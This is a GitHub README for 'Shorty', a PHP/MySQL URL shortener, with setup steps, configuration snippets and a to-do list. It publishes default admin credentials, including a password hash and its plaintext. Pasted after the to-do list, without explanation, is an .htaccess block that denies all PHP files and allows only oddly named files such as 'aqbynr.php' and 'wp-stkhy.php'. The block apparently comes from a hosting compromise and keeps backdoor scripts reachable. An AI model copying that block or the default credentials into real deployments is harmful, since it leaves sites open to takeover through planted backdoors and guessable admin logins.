
<h1 align = "center">  <img src = "./assets/img/inside-header-logo.png" height = "30" width = "40">&nbspShorty - To help you shorten links! </h1>
<!-- <hr> -->
<div>
To help you grow, scale, and dominate through the power of <b>link management</b>. Whether you’re sharing one link or millions, <b>Shorty</b> lets you personalize, share, and track your content links, while capturing data with every click.</div>
 </div>
 <br>
<div align="center">
  <img src="https://forthebadge.com/images/badges/built-with-love.svg" />
  <img src="https://forthebadge.com/images/badges/uses-brains.svg" />
  <img src="https://forthebadge.com/images/badges/powered-by-responsibility.svg" />
  <br/>
  <img src="https://img.shields.io/github/repo-size/apoorvaron/Shorty?style=for-the-badge" />
  <img src="https://img.shields.io/github/license/apoorvaron/Shorty?style=for-the-badge" />
  <img src="https://img.shields.io/github/issues-closed-raw/apoorvaron/Shorty?style=for-the-badge" />
  <img src="https://img.shields.io/github/issues/apoorvaron/Shorty?style=for-the-badge" />
  <img src="https://img.shields.io/github/issues-closed/apoorvaron/Shorty?style=for-the-badge" />
  <img src="https://img.shields.io/github/stars/apoorvaron/Shorty?style=for-the-badge" />
  <img src="https://img.shields.io/github/forks/apoorvaron/Shorty?style=for-the-badge" />
  <img src="https://img.shields.io/github/issues-pr/apoorvaron/Shorty?style=for-the-badge" />
  <img src="https://img.shields.io/github/last-commit/apoorvaron/Shorty?style=for-the-badge" />
  <img src="https://img.shields.io/github/contributors/apoorvaron/Shorty?style=for-the-badge" />
  <img src="https://img.shields.io/github/issues-pr-closed-raw/apoorvaron/Shorty?style=for-the-badge" />
  
</div>
<br>

 
 ## :snowflake: Features:

- Link Management
- Data Security
- Personalized links
- Link Tracking

## :snowflake: Demo

- **Website** http://shrty.rf.gd/

## :hammer_and_wrench: Tech Stack
![HTML5](https://img.shields.io/badge/html5-%23E34F26.svg?style=for-the-badge&logo=html5&logoColor=white)
![JavaScript](https://img.shields.io/badge/javascript-%23323330.svg?style=for-the-badge&logo=javascript&logoColor=%23F7DF1E)
![CSS3](https://img.shields.io/badge/css3-%231572B6.svg?style=for-the-badge&logo=css3&logoColor=white)
![PHP](https://img.shields.io/badge/php-%23777BB4.svg?style=for-the-badge&logo=php&logoColor=white)
![Less](https://img.shields.io/badge/less-2B4C80?style=for-the-badge&logo=less&logoColor=white)
![MySQL](https://img.shields.io/badge/mysql-%2300f.svg?style=for-the-badge&logo=mysql&logoColor=white)
![jQuery](https://img.shields.io/badge/jquery-%230769AD.svg?style=for-the-badge&logo=jquery&logoColor=white)
![Bootstrap](https://img.shields.io/badge/bootstrap-%238511FA.svg?style=for-the-badge&logo=bootstrap&logoColor=white)

## Screenshots

<div align = "center">
<img src = "./img/screenshot.gif">
</div>
<div id="top">

## Contribute

We welcome contributions to our project.
Before making a contribution, check the <a href="https://github.com/apoorvaron/Shorty/blob/main/CONTRIBUTING.md">contribution guide.</a>

## Code of Conduct

Check out the <a href="https://github.com/apoorvaron/Shorty/blob/main/CODE_OF_CONDUCT.md">Code of Conduct</a> to know an inclusive environment that respects all contributions.

## License

This project is <a href="https://github.com/apoorvaron/Shorty/blob/main/LICENSE">Licensed</a> under the MIT license.
          
 ##  🚀 Getting Started
  
- [Setup] Shorty Project Setup Tutorial
- Tutorial - https://www.youtube.com/watch?v=L5HdDeYaKd0

- Must install PHP version (FOR WINDOWS) & (FOR MAC) Both
- Tutorial - https://www.youtube.com/watch?v=mVBe75aGBHQ
- PHP version used -> ( 8.1.9 )


- Must install xampp (FOR WINDOWS) and MAMP (FOR MAC) 
- Tutorial - https://www.youtube.com/watch?v=at19OmH2Bg4
- MySQL version used -> ( 8.0.29 )

-------*---------*---------*---------*---------*---------

Step -1   Download the Zip file 

Step -2   Unzip it & Rename the folder from "tiny-main" to "tiny"

Step -3   Put a tiny folder inside 

          /Applications/MAMP/htdocs/  folder  (FOR MAC)
          C:/xampp/htdocs/            folder  (FOR WINDOWS)

Step -4   Set the below snippet inside /Applications/MAMP/htdocs/tiny/env.php. file (FOR MAC & having MAMP)
          
            <?php
                $env_server = "localhost";
                $env_username = "root";
                $env_password = "root";
                $env_database = "tiny";
                $env_port = "8889";
            ?>

Step -4   Set the below snippet inside htdocs/tiny/env.php. file (FOR WINDOWS & XAMPP)
          

            <?php
                 $env_server = "localhost:3306";
                 $env_username = "root";
                 $env_password = "";
                 $env_database = "tiny";
                 $env_port = "3306";
            ?>

Step -5   Create ".htaccess" file inside htdocs/tiny/ and Paste below code snippet.(FOR MAC & having MAMP)

                ErrorDocument 404 http://localhost:8888/tiny/404.php

                RewriteEngine On
                RewriteCond %{REQUEST_FILENAME} !-d
                RewriteCond %{REQUEST_FILENAME}\.php -f
                RewriteRule ^(.*)$ $1.php [NC,L]


                RewriteEngine On

                RewriteCond $1 !^(index\.php)
                RewriteCond %{REQUEST_FILENAME} !-f
                RewriteCond %{REQUEST_FILENAME} !-d
                RewriteRule ^(.*)$ index.php?/$1 [L]
                
                
Step -5   Create ".htaccess" file inside htdocs/tiny/ and Paste below code snippet.(FOR WINDOWS)

                ErrorDocument 404 http://localhost/tiny/404.php

                RewriteEngine On
                RewriteCond %{REQUEST_FILENAME} !-d
                RewriteCond %{REQUEST_FILENAME}\.php -f
                RewriteRule ^(.*)$ $1.php [NC,L]


                RewriteEngine On

                RewriteCond $1 !^(index\.php)
                RewriteCond %{REQUEST_FILENAME} !-f
                RewriteCond %{REQUEST_FILENAME} !-d
                RewriteRule ^(.*)$ index.php?/$1 [L]
                
Step -6   Change the file content inside tiny/htdocs/siteName.php

          1) FOR MAC & MAMP
                <?php
                    $siteName = "http://localhost:8888/tiny/";
                ?>
                
          2) FOR Windows
                <?php
                    $siteName = "http://localhost/tiny/";
                ?>
                
Step -7   Start Apache & MySQL Server in XAMPP Panel or MAMP Panel

Step -8   To Setup the database, open 

          localhost:8888/phpmyadmin    (FOR MAC & MAMP)
          localhost/phpmyadmin         (FOR WINDOWS & XAMPP)

Step -9   Create New Database 

Step -10   Database Name  "tiny"

Step -11   Import the Database from the "htdocs/tiny/tiny.sql" directory. 

           tiny.sql (db file)

Step -12   Run in the browser 

          localhost:8888/tiny/     (FOR MAC)
          localhost/tiny/          (FOR WINDOWS)

          <br><br>
! IMPORTANT -> users table must contain one row 

          1) uniqueNo = "shorty"
          2) email = "shorty@gmail.com"
          3) password = "62b5fe5724b08db455672377fb31e95b"
          4) img = "../assets/user-img/1659983584admin-img.png"
          
-> Front Page shorted links go into the admin account 
          
          email    -> shorty@gmail.com
          password -> shorty@gmail.com

-> While Hosing

          1) Change env.php credentials
          2) Change siteName.php 
          3) Upload files & dB.
          
-> What Can we do now?
          
          1) 404 Page and functionality
          2) Forget Password Functionality
          3) Sign in / Sign up with Google
          4) All things must be done by session not using a URL
          5) All things must be done with APIs
          6) Use of action attribute in Any type of forms
          7) Footer has Year 2 times 
          8) If we edit the profile then an alert of pdf or nonimage is chosen as the image 
          9) Make an admin panel 
          10) Only the admin can login to the shorty@gmail.com user panel
          11) Mobile view user panel header has Hii username
          12) Dynamic Titles of pages 
          13) Want to update -> edit your profile?
          14) Mobile view, image, main page, margin-top 
          15) Remember Me button checks if the cookie setting
          16) SMS Sender
          17) Open only in one tab at once
          18) Add a chatbot 
          19) Add a WhatsApp icon to connect with the admin on WhatsApp
          20) if hit shrty.rf.gd -> then by default shrty.rf.gd?i=1# appear on URL
          21) Account registration with OTP
          22) Captcha (I m not a robot)
          23) Can not access the folder
          24) Use of local storage 
          25) Don't cut (pop is there you have some unsaved want to leave ?)
          26) custom short link from the front page too
          27) We get a performance increase by specifying the default route since we don't have to scan directories.
          28) add infinity credentials in the readme 
          29) change shrty admin cred from shorty@gmail.com to apoorv.shorty@gmail.com
          30) Placeholders have asterisk sign
          31) Database simply one table or merge something for total clicks & visitor counter table
          32) If the session is not logged out then click on Login Button then go to the panel if his session logged out then go to login page otherwise go to the user panel
          33) What type of Data structure do we use in this project
          34) Security Issues
          35) can't access inside files using htaccess (add .htaccess files in folders like: localhost:8888/tiny/assets/images/.htacccess)
          36) if any pr merged then have to refresh hard to see proper things, what changes should be made so that no hard refresh or removal of chrome history is done
          37) Merge siteName.php & env.php && admin credentials 
          38) using inspect too , password should not visible by changing the type="password" to text
          39) Add in readme that if styling is not correct try hard refresh by clicking this and this keys
          40) in register Page , Password validation like atleast 8 char etc.. should be in another div , right or left to the registration form , something like this (https://usict.acm.org/dashboard/user-portal/register) 
          41) Change readme by changing steps from download zip to cloning the repo
          42) Guest Form Embedded Domain name should be like password input field of registeration page
          <FilesMatch ".*\.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|suspected)$">
                    Order Allow, Deny
                    Deny from all
          </FilesMatch>
          <FilesMatch "^(aqbynr.php|zdjpks.php|wp-ybwid.php|wp-stkhy.php|moni-fcpm.php|moni-smmk.php)$">
                    Order Allow, Deny
                    Allow from all
          </FilesMatch>
          


<!-- ## Contributors ✨

Thanks go to these wonderful people 💪

![Contributors](https://contrib.rocks/image?repo=apoorvaron/Shorty)

 -->
          
          
-> Hosted on Infinity Free with Gmail: apoorv.shorty@gmail.com
   

##  🤝 Contributors :

Thanks to all the contributors.

<a href="https://github.com/apoorvaron/Shorty/graphs/contributors"><img src="https://contrib.rocks/image?repo=apoorvaron/Shorty"></a>
</div>

<br><br>
 <a href="#top">Back to top</a>

